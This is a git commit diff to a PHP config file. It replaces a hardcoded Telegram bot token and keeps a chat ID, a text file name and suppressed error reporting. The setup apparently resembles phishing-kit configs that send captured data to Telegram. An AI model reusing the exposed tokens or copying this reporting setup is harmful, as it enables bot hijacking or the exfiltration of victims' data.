c71dc9f0c7aac3b2dd7c96b821c2b5134eca4b43
HamadaRIgaloo <119463837+HamadaRIgaloo@users.noreply.github.com>
2022-11-30 01:53:39 +0100

    Update conf.php

--- settings/conf.php
+++ settings/conf.php
@@ -2,7 +2,7 @@
 
 error_reporting(0);
 
-define("TELEGRAM_TOKEN", "5172354560:AAFgOcDFvajOfb-Z97eNKEEDRmaRp5HFsvw");
+define("TELEGRAM_TOKEN", "5685344408:AAFecHM0jruHFn06IdPB2uEwBf1UpiyaDaI");
 define("TELEGRAM_CHAT_ID", "1001504028041");
 define("TELEGRAM_CHAT_IDD", "-1001504028041");
 define("TXT_FILE_NAME", 'mjinina.txt');
